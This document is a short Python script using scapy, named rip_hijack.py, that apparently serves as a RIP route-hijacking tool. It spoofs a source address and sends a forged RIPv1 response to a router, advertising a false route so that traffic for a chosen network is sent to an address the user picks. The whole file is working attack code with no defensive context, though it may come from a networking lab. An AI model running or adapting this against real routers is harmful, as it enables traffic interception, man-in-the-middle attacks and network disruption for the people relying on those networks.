from scapy.all import *
import sys
import os

# python3 rip_hijack.py "192.168.201.10" "192.168.203.0/24" "192.168.201.200"
ip_router = sys.argv[1]
network_addr = sys.argv[2].split("/")[0]
cidr = int(sys.argv[2].split("/")[1])
mask_addr = ".".join([str((0xffffffff << (32-cidr) >> i) & 0xff) for i in [24, 16, 8, 0]])
ip_route_to = sys.argv[3]



pkt = IP(src=ip_route_to, dst=ip_router)/UDP()/RIP(cmd='resp', version=1)/RIPEntry(addr=network_addr, mask = mask_addr)
send(pkt)

